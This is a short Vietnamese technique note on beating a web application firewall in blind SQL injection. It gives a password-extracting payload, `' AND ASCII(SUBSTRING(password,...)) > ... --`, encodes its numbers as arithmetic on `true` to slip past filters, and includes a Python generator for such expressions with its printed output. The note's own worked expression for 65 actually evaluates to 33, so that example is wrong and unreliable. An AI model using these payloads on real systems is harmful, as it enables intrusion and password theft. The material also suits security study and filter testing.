# Tại sao dùng ???
- Firewall chặn kí tự `' AND ASCII(SUBSTRING(password,1,1)) > 65 --` -> chặn 
- Muốn vượt qua dùng `' AND ASCII(SUBSTRING(password,true,true)) > (true+(true+true)*(true+true)*(true+true)*(true+true)*(true+true)) --`
- `1` (vị trí ký tự) → true
- `65` (mã ASCII của `'A'`) → `(true+(true+true)*(true+true)*(true+true)*(true+true)*(true+true))`

- Dùng code để gen 
```py
def find_expressions(limit):
    """Source: https://chat.openai.com/share/2eb7a5cd-0980-4734-b897-acaf8e546969"""
    if limit == 0:
        return "false"
    if limit == 1:
        return "true"

    # Initialize a list to store the number of operations needed to reach each target
    min_operations = [float('inf')] * (limit + 1)
    min_operations[1] = 0  # Base case

    # Initialize a list to store the expression for each target
    expressions = ["false"] * (limit + 1)
    expressions[1] = "true"

    # Iterate through each number from 2 to target
    for i in range(2, limit + 1):
        # Try addition
        for j in range(1, i):
            if min_operations[j] + min_operations[i - j] + 1 < min_operations[i]:
                min_operations[i] = min_operations[j] + \
                    min_operations[i - j] + 1
                expressions[i] = "(" + expressions[j] + \
                    "+" + expressions[i - j] + ")"

        # Try multiplication
        for j in range(2, int(i ** 0.5) + 1):
            if i % j == 0:
                if min_operations[j] + min_operations[i // j] + 1 < min_operations[i]:
                    min_operations[i] = min_operations[j] + \
                        min_operations[i // j] + 1
                    expressions[i] = "(" + expressions[j] + \
                        "*" + expressions[i // j] + ")"

    return expressions

if __name__ == "__main__":
    expressions = find_expressions(256)
    for c in 'Jorian':
        print(f"{c} ({ord(c)}): {expressions[ord(c)]}")
```


OUTPUT:
```py
J (74): ((true+true)*(true+((true+true)*((true+true)*((true+(true+true))*(true+(true+true)))))))
o (111): ((true+(true+true))*(true+((true+true)*((true+true)*((true+(true+true))*(true+(true+true)))))))
r (114): ((true+true)*((true+(true+true))*(true+((true+true)*((true+(true+true))*(true+(true+true)))))))
i (105): ((true+(true+true))*((true+(true+(true+(true+true))))*(true+((true+true)*(true+(true+true))))))
a (97): (true+((true+true)*((true+true)*((true+true)*((true+true)*((true+true)*(true+(true+true))))))))
n (110): ((true+true)*(true+((true+true)*((true+(true+true))*((true+(true+true))*(true+(true+true)))))))
```